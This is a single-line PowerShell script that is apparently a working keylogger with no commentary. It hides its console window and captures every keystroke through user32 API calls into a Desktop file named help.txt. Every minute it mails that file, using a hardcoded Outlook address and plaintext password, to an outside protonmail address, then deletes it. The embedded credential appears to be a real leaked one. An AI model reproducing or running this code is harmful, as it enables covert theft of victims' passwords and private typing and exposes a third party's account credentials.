Set-Variable -Name t -Value ('using System;using System.Runtime.InteropServices;public class WinAPI{[DllImport("user32.dll",SetLastError=true)]public static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);}') ;Add-Type -TypeDefinition $t;Set-Variable -Name handle -Value ((Get-Process -Id $PID).MainWindowHandle);if($handle -ne [IntPtr]::Zero){[WinAPI]::ShowWindow($handle,0)};Set-Variable -Name RunTimeP -Value (1);Set-Variable -Name From -Value ("luccasmachado001@outlook.com");Set-Variable -Name Pass -Value ("hbzgnuqauqooxcbq");Set-Variable -Name To -Value ("carlosalberto58@protonmail.com");Set-Variable -Name Subject -Value ("pragmatica");Set-Variable -Name body -Value ("report");Set-Variable -Name SMTPServer -Value ("smtp-mail.outlook.com");Set-Variable -Name SMTPPort -Value ("587");Set-Variable -Name credentials -Value (New-Object Management.Automation.PSCredential $From,($Pass|ConvertTo-SecureString -AsPlainText -Force));function Start-Helper{Set-Variable -Name DesktopPath -Value ([IO.Path]::Combine([Environment]::GetFolderPath("Desktop"),"help.txt"));Set-Variable -Name signatures -Value ('[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]public static extern short GetAsyncKeyState(int virtualKeyCode);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);');Set-Variable -Name API -Value (Add-Type -MemberDefinition $signatures -Namespace API -Name "Win32" -PassThru);Set-Variable -Name null -Value (New-Item -Force -ItemType File -Path $DesktopPath);try{while($true){Set-Variable -Name TimeStart -Value (Get-Date);Set-Variable -Name TimeEnd -Value ($TimeStart.AddMinutes($RunTimeP));while($TimeEnd-ge(Get-Date)){Start-Sleep -Milliseconds 40;for(Set-Variable -Name ascii -Value (9);$ascii-le 254;$ascii++){Set-Variable -Name state -Value ($API::GetAsyncKeyState($ascii));if($state-eq -32767){$null=[console]::CapsLock;$virtualKey=$API::MapVirtualKey($ascii,3);$kbstate=New-Object Byte[] 256;$checkkbstate=$API::GetKeyboardState($kbstate);$mychar=New-Object -TypeName System.Text.StringBuilder;$success=$API::ToUnicode($ascii,$virtualKey,$kbstate,$mychar,$mychar.Capacity,0);if($success){[System.IO.File]::AppendAllText($DesktopPath,$mychar,[System.Text.Encoding]::Unicode)}}}}Send-MailMessage -Port $SMTPPort -To $To -SmtpServer $SMTPServer -Credential $credentials -Attachments $DesktopPath -Subject $Subject -UseSsl -From $From -Body $body;Remove-Item -Path $DesktopPath -Force}}finally{exit 1}};Start-Helper 
